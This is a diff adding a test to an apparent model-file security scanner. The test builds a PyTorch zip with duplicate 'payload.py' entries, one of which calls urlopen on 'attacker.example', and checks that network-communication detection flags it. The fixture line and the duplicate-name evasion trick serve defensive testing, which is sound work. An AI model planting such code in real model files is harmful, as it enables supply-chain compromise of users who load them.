@@ -613,6 +613,30 @@ def test_pytorch_zip_scans_pickle_members_for_network_when_pickle_scanner_disabl
     assert any(check.location == f"{model_path}:archive/data.pkl" for check in network_failures)
 
 
+def test_pytorch_zip_jit_scan_uses_pickle_entry_identity_for_duplicate_names(tmp_path: Path) -> None:
+    model_path = tmp_path / "duplicate_source_name.pt"
+    with warnings.catch_warnings():
+        warnings.simplefilter("ignore", UserWarning)
+        with zipfile.ZipFile(model_path, "w") as zip_file:
+            zip_file.writestr("archive/version", "3\n")
+            zip_file.writestr("archive/byteorder", "little")
+            zip_file.writestr("archive/code/payload.py", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
+            zip_file.writestr(
+                "archive/code/payload.py",
+                b"import urllib.request\nurllib.request.urlopen('http://attacker.example/model')\n",
+            )
+
+    result = PyTorchZipScanner().scan(str(model_path))
+
+    network_failures = [
+        check
+        for check in result.checks
+        if check.name == "Network Communication Detection" and check.status == CheckStatus.FAILED
+    ]
+    assert network_failures
+    assert any(check.location == f"{model_path}:archive/code/payload.py" for check in network_failures)
+
+
 @pytest.mark.performance
 def test_pytorch_zip_skips_numeric_data_files(tmp_path):
     """Test that numeric tensor data files in archive/data/ are skipped during JIT scanning."""
